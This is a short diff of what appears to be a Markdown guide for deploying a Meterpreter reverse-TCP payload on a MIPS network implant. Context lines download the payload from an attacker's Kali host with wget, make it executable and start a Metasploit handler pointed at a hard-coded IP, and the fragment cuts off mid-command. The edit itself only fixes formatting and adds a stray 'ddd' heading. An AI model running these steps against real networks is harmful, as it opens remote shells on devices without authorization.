@@ -20,8 +20,8 @@ meterpreter-mipsbe-reverse-tcp`
 `wget <KALI IP>/meterpreter-mipsbe-reverse-tcp -O /etc/turtle/meterpreter/meterpreter-mipsbe-reverse-tcp`<br />
 `chmod 755 /etc/turtle/meterpreter/meterpreter-mipsbe-reverse-tcp`<br />
 
-**5 - On Kali: start Meterpreter listerner<br />
-####
+**5 - On Kali: start Meterpreter listerner**<br />
+#### ddd
 sudo msfconsole -q -x "use exploit/multi/handler;
 set payload linux/mipsbe/meterpreter_reverse_tcp;
 set lhost 167.99.72.29;
